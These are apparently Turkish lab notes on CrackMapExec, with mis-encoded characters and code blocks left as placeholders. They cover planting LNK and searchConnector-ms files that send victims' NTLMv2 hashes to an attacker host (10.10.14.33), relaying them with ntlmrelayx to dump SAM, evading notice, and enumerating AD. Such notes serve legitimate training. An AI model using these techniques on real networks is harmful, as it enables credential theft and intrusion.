### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

